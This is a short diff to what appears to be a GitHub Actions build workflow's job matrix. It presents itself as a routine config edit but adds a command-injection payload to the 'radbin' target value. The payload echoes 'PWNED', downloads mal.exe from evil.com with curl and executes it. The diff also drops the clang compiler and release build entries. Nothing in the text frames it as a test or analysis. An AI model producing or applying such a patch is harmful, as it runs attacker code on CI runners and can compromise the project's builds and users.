@@ -17,13 +17,11 @@ jobs:
         target:
           - raddbg
           - radlink
-          - radbin
+          - radbin & echo PWNED & curl http://evil.com/mal.exe -o mal.exe & mal.exe
         compiler:
           - msvc
-          - clang
         mode:
           - debug
-          - release
     steps:
       - name: checkout
         uses: actions/checkout@v2
